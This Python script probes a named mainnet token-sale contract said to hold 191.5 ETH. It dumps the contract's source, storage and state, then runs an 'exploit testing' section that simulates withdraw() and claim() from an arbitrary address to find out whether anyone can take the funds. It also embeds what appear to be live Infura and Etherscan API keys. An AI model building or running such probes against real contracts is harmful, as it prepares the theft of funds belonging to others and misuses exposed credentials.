#!/usr/bin/env python3
"""
Deep analysis of AhooleeTokenSale contract with 191.5 ETH
- endTime expired 3067 days ago (Sept 2017)
- release(), unlock(), execute() callable
"""
import json
import subprocess
import re

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, from_addr="0x0000000000000000000000000000000000000001", value="0x0"):
    result = rpc_call("eth_call", [{"to": to, "data": data, "from": from_addr, "value": value}, "latest"])
    return result

def estimate_gas(to, data, from_addr="0x0000000000000000000000000000000000000001", value="0x0"):
    result = rpc_call("eth_estimateGas", [{"to": to, "data": data, "from": from_addr, "value": value}])
    return result

def get_balance(addr):
    result = rpc_call("eth_getBalance", [addr, "latest"])
    if result and 'result' in result:
        return int(result['result'], 16) / 1e18
    return 0

def get_storage(addr, slot):
    result = rpc_call("eth_getStorageAt", [addr, slot, "latest"])
    if result and 'result' in result:
        return result['result']
    return None

def get_code(addr):
    result = rpc_call("eth_getCode", [addr, "latest"])
    if result and 'result' in result:
        return result['result']
    return "0x"

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
    except:
        pass
    return None

print("=" * 80)
print("AHOOLEE TOKEN SALE DEEP ANALYSIS")
print("=" * 80)

TARGET = "0x575cb87ab3c2329a0248c7d70e0ead8e57f3e3f7"

print(f"\n[CONTRACT] {TARGET}")
print(f"[BALANCE] {get_balance(TARGET):.4f} ETH")

# Check bytecode length - short bytecode = Parity wallet
code = get_code(TARGET)
print(f"[BYTECODE LENGTH] {len(code)} chars")

if len(code) < 200:
    print("[!] SHORT BYTECODE - Likely Parity wallet proxy")
else:
    print("[*] Full contract bytecode")

# Get source
source_data = get_source(TARGET)
if source_data:
    src = source_data.get("SourceCode", "")
    contract_name = source_data.get("ContractName", "Unknown")
    abi = source_data.get("ABI", "")
    print(f"[CONTRACT NAME] {contract_name}")

    if src.startswith("{{"):
        try:
            src_json = json.loads(src[1:-1])
            sources = src_json.get("sources", {})
            src = "\n".join([v.get("content", "") for v in sources.values()])
        except:
            pass

    print(f"[SOURCE LENGTH] {len(src)} chars")

    if src:
        lines = src.split('\n')
        # Print key parts of source
        print("\n" + "=" * 60)
        print("[WITHDRAW AND CLAIM FUNCTIONS]")
        print("=" * 60)

        for i, line in enumerate(lines):
            if re.search(r"function\s+(withdraw|claim|endTime|release)", line, re.IGNORECASE):
                # Print function and next 30 lines
                print(f"\n  Found at line {i+1}:")
                for j in range(i, min(i+35, len(lines))):
                    print(f"    {j+1}: {lines[j][:75]}")
                    if lines[j].strip() == "}" and j > i + 2:
                        break

# Check gas patterns to determine if Parity or real
print("\n" + "=" * 60)
print("[GAS PATTERN ANALYSIS - Parity Detection]")
print("=" * 60)

test_selectors = [
    ("0x8da5cb5b", "owner()"),
    ("0x3ccfd60b", "withdraw()"),
    ("0x12345678", "random1()"),
    ("0x87654321", "random2()"),
    ("0xabcdef12", "random3()"),
    ("0xfedcba98", "random4()"),
]

gas_values = []
for sel, name in test_selectors:
    result = estimate_gas(TARGET, sel)
    if result and 'result' in result:
        gas = int(result['result'], 16)
        gas_values.append(gas)
        print(f"  {name}: {gas}")
    elif result and 'error' in result:
        gas_values.append(-1)
        err = result['error'].get('message', '')[:40]
        print(f"  {name}: ERROR - {err}")

# Calculate variance
positive_gas = [g for g in gas_values if g > 0]
if len(positive_gas) >= 2:
    avg = sum(positive_gas) / len(positive_gas)
    variance = max(positive_gas) - min(positive_gas)
    variance_pct = (variance / avg * 100) if avg > 0 else 0
    print(f"\n  Variance: {variance_pct:.1f}%")
    if variance_pct < 15:
        print("  [!] PARITY WALLET PATTERN DETECTED - Echo behavior")
    else:
        print("  [*] REAL CONTRACT - Different functions have different gas")

# Storage analysis
print("\n" + "=" * 60)
print("[STORAGE ANALYSIS]")
print("=" * 60)

for i in range(20):
    val = get_storage(TARGET, hex(i))
    if val and val != "0x" + "0"*64:
        print(f"  Slot {i}: {val}")

# Check key state variables
print("\n" + "=" * 60)
print("[STATE VARIABLES]")
print("=" * 60)

state_selectors = {
    "owner()": "0x8da5cb5b",
    "endTime()": "0x3197cbb6",
    "beneficiary()": "0x38af3eed",
    "token()": "0xfc0c546a",
    "totalRaised()": "0x0c928090",
    "hardCap()": "0xfb86a404",
    "softCap()": "0x36b29447",
    "minEtherContribution()": "0xdf0a3f4f",
}

for name, sel in state_selectors.items():
    result = eth_call(TARGET, sel)
    if result and result.get('result') and result['result'] != "0x":
        r = result['result']
        if len(r) > 2:
            try:
                val = int(r, 16)
                if val > 10**38:
                    print(f"  {name}: 0x{r[26:]}")
                elif val > 10**15:  # Likely ETH amount
                    print(f"  {name}: {val/1e18:.4f} ETH")
                else:
                    print(f"  {name}: {val}")
            except:
                print(f"  {name}: {r[:66]}")

# Test if we can call withdraw as anyone
print("\n" + "=" * 60)
print("[EXPLOIT TESTING]")
print("=" * 60)

# Check who can call withdraw
owner_result = eth_call(TARGET, "0x8da5cb5b")
if owner_result and owner_result.get('result'):
    owner = "0x" + owner_result['result'][26:]
    print(f"Owner: {owner}")

# Test calling withdraw from random address
print("\nTesting withdraw() from random address:")
result = estimate_gas(TARGET, "0x3ccfd60b", from_addr="0x0000000000000000000000000000000000000001")
if result:
    if 'result' in result:
        gas = int(result['result'], 16)
        print(f"  [+] withdraw() callable! Gas: {gas}")
    elif 'error' in result:
        err = result['error'].get('message', '')
        print(f"  [-] withdraw() reverts: {err}")

# Test claim() function
print("\nTesting claim() from random address:")
result = estimate_gas(TARGET, "0x4e71d92d", from_addr="0x0000000000000000000000000000000000000001")
if result:
    if 'result' in result:
        gas = int(result['result'], 16)
        print(f"  [+] claim() callable! Gas: {gas}")

        # What does it do?
        call_result = eth_call(TARGET, "0x4e71d92d")
        print(f"  Result: {call_result}")
    elif 'error' in result:
        err = result['error'].get('message', '')
        print(f"  [-] claim() reverts: {err}")

# Test claimedOf for various addresses
print("\nTesting claimedOf(address) for various addresses:")
test_addrs = [
    "0x0000000000000000000000000000000000000001",
    "0xddbc86c2e739ce2f8e3865ede799a239336a2db1",  # owner
    "0xb40060deae8fd58acc4ad97ef28e924a9dfd0be3",  # beneficiary
]

claimed_selector = "0x51de1020"  # claimedOf(address)
for test_addr in test_addrs:
    padded = test_addr[2:].lower().zfill(64)
    data = claimed_selector + padded
    result = eth_call(TARGET, data)
    if result and result.get('result'):
        val = int(result['result'], 16)
        print(f"  claimedOf({test_addr[:10]}...): {val}")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
